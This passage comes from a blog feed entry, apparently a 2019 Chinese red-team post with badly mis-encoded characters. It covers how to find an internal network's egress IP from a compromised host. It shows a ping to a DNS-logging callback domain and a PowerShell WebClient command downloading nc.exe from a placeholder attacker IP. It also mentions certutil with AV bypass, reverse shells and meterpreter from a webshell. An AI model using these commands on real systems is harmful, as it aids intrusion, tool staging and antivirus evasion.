id="pingï¼ˆlinux-windowsé€šç”¨ï¼‰"><a href="#pingï¼ˆlinux-windowsé€šç”¨ï¼‰" class="headerlink" title="pingï¼ˆlinux windowsé€šç”¨ï¼‰"></a>pingï¼ˆlinux windowsé€šç”¨ï¼‰</h3><p>ç»“åˆceye</p><p>ç›´æ¥æ‰§è¡Œpingå‘½ä»¤ï¼Œèµ°<code>DNS Query</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping metzl4.ceye.io</span><br></pre></td></tr></table></figure></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/B51E2419-7B28-4CDE-8B1B-DAF2924545D1.png" alt="f3cc55ed09188d082f807b70cbbb4b37"></p><h2 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h2><h3 id="WebClient"><a href="#WebClient" class="headerlink" title="WebClient"></a>WebClient</h3><p>å’Œ<code>Wget</code>ä¸€ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¹³æ—¶ç»å¸¸ä¼šä½¿ç”¨ä¸‹é¢çš„è¯­å¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://xxx.xxx.xxx.xxx/nc.exe"</span>,<span class="string">"nc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>åŒæ ·ï¼Œåªè¦æ˜¯èµ°httpé€šé“ï¼Œé‚£å°±è‚¯å®šå¯ä»¥å’Œæˆ‘ä»¬çš„vpsè¿›è¡Œè¿æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°å‡ºç½‘ipäº†</p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/EB7707FA-E591-4520-9874-DE0D281F4FBF.png" alt="2c06dc63c41d0c1d698e9d1fb698bf22"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/8A3B4E42-2050-418E-A08A-E5E0A31C3FB4.png" alt="3be76eb775caa75eea974875b0fe5c59"></p><h3 id="WebRequest"><a href="#WebRequest" class="headerlink" title="WebRequest"></a>WebRequest</h3><p><code>Powershell version &gt; 3.0</code> å°±å¯ä»¥ä½¿ç”¨Windowsä¸Šçš„wgetäº†2333</p><p>æŸ¥çœ‹Powershellç‰ˆæœ¬ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVersion</span><br></pre></td></tr></table></figure></p><p>å®˜æ–¹æ–‡æ¡£ï¼š<br><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1</a><br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/86CB25E8-75F4-4FFE-8FA4-85DE4BA4ED66.png" alt="c36f05c4f3fda64d50bdd311c14bf9c4"></p><p>Usage:<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/1717FC59-8205-4E3F-A1E2-DD86447ECDCE.png" alt="a1dcebf74d84473ab952f25e9266cfb4"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/64EE7E2C-241F-4575-89F6-7A1BBC891B6F.png" alt="de63fcec3f88e9e2d2b2622791d1c748"></p><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p><code>certutil</code>è¿™ä¸ªä¸œè¥¿è¢«AVç›‘æ§å¾—å¤ªæ­»äº†..<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/933199E4-E637-48E8-AFA8-4212D731755B.png" alt="fdedf94858c856e6560d27dfcb634d6e"><br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/BE759B80-FA21-4F1B-88E9-5749FD816B2D.png" alt="cdbdb7eb2e69f14fa211e114b88dd701"></p><p>å®æˆ˜ç”¨çš„è¯ä¹Ÿéœ€è¦ä¸€å®šçš„ç»•è¿‡æŠ€å·§</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>startå‘½ä»¤ç›´æ¥ä¼šå¼€å¯ä¸€ä¸ªieè¿›ç¨‹å»è®¿é—®ç›®æ ‡url<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/351FF26E-1CED-4A96-ACC9-CBB71041B898.png" alt="a7015efe5a0ceeddc7a78797d42d364a"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/53FA6E22-78DB-439F-B51D-121D8C76FB81.png" alt="65be4f74982d1bcdf0b6e0545a21bf96"></p><p>å½“ç„¶ï¼Œéœ€è¦æ³¨æ„ç”¨æˆ·ï¼Œåˆ«ç»™åˆ«äººè¿œç¨‹æ¡Œé¢å¼€ä¸ªieå•¥çš„</p><h3 id="â€¦"><a href="#â€¦" class="headerlink" title="â€¦"></a>â€¦</h3><p>è¿˜æœ‰å…¶ä»–çš„å§¿åŠ¿ï¼Œåæ­£æˆ‘è§‰å¾—åªè¦æ˜¯å¯ä»¥ç”¨å„ç§ä¸œè¥¿è®¿é—®å¤–é¢çš„ï¼Œéƒ½å¯ä»¥æ‹¿åˆ°çœŸå®çš„å‡ºå£ipï¼Œå¤§å“¥ä»¬ä¹Ÿå¯ä»¥ç ”ç©¶ä¸‹</p><h2 id="0x03-åå¼¹shell"><a href="#0x03-åå¼¹shell" class="headerlink" title="0x03 åå¼¹shell"></a>0x03 åå¼¹shell</h2><p>æ—¢ç„¶æœ‰Webshelläº†ï¼Œæœ€å¸¸è§çš„æ–¹å¼ä¹Ÿå°±æ˜¯åå¼¹ä¸ªshellå•¥çš„ï¼Œè¿™é‡Œå°±ä¸å¤šè®²äº†ï¼Œos shell,meterpreterå•¥çš„éƒ½ok</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>è¿™ä¸ªé—®é¢˜ä¹Ÿæ˜¯çªå‘å¥‡æƒ³ï¼Œå¥½åƒå…·ä½“çš„æ„ä¹‰ä¹Ÿä¸æ˜¯å¾ˆå¤§ï¼Œä¸»è¦æ˜¯åœ¨æƒ³å¦‚ä½•è§„é¿AVå’Œä¸é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨å’Œå†™æ–‡ä»¶çš„æƒ…å†µä¸‹è¿›è¡Œä¸€ä¸ªipè·å–ï½å¸ˆå‚…ä»¬è§è°…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-20 20:14:23&lt;br&gt;&lt;img src=&quot;/wallpaper/30597.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
